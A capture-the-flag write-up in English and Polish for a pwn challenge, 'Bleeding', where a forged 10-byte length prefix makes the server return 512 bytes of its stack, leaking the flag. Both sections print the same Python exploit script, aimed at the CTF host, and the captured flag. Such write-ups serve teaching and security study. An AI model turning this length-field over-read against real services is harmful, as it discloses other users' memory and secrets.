# Bleeding (pwn 50)

###ENG
[PL](#pl-version)

For the task we get a [client](bleed_client) ELF binary and a server address to connect to.
The client asks us for some seed word, performs some calculations on it and sends the result to the server.
The server responds with `secure` password generated from our input and with our seed word.

The encoded data sent by client to server have 10 more bytes than our seed word.
We tried reversing the encoding algorithm, which consisted of xors, additions and subtractions but we quickly realised that it's not necessary.
The length of the seed word is encoded in the 10-bytes prefix added by client!

This meant that we could generate payload for a 512 bytes long seed and then send to the server only the initial 10 bytes.
The server would then try to sent back the seed to us, but would try to send 512 bytes, where there were 0, which resulted in sending random bytes from server stack, flag included.

```python
import socket
from time import sleep


def encode():
    # full payload: 'ef9e8dd834ffbabea6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b2860a00'
	# only prefix
    return 'ef9e8dd834ffbabea6d5'.decode('hex')


def main():
    url = "4ff0eff1d46c1d74d152aaf36de6f2799020bdbc.ctf.site"
    port = 50000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((url, port))
    sleep(1)
    s.sendall(encode())
    sleep(1)
    received = s.recv(9999)
    print(received)
    print(received.encode("hex"))


main()
```

`EKO{1m_bl33d1ng_byt35}`

###PL version

W zadaniu dostajemy [klienta](bleed_client) będącego linuxowm ELFem, oraz adres serwera do którego należy się połączyć.
Klient pyta nas o dowolny ciąg, wykonuje na nim obliczenia i wysyła do serwera.
Serwer odpowiada `bezpiecznym` hasłem wygenerowanym dla naszych danych, oraz ciągiem który podaliśmy.

Zakodowane przez klienta dane mają o 10 bajtów więcej niż ciąg który podajemy.
Próbowaliśmy początkowo zreversować algorytm kodowania, złożony z xorów, dodawań i odejmowań, ale szybko zobaczyliśmy, że nie ma takiej potrzeby.
Długość naszego ciągu była zakodowana w 10-bajtowym prefixie dodawanym przez klienta do naszego ciągu.

To oznacza że mogliśmy wygenerować klientem dane dla 512 bajtowego ciągu a potem wysłać do serwera jedynie pierwsze 10 bajtów.
Serwer próbował odesłać nam nasze dane o długości 512 bajtów, podczas gdy wysłaliśmy 0, co spowodowało wysłanie losowych wartości ze stosu serwera, w tym flagi.

```python
import socket
from time import sleep


def encode():
    # full payload: 'ef9e8dd834ffbabea6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b2860a00'
	# only prefix
    return 'ef9e8dd834ffbabea6d5'.decode('hex')


def main():
    url = "4ff0eff1d46c1d74d152aaf36de6f2799020bdbc.ctf.site"
    port = 50000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((url, port))
    sleep(1)
    s.sendall(encode())
    sleep(1)
    received = s.recv(9999)
    print(received)
    print(received.encode("hex"))


main()
```

`EKO{1m_bl33d1ng_byt35}`
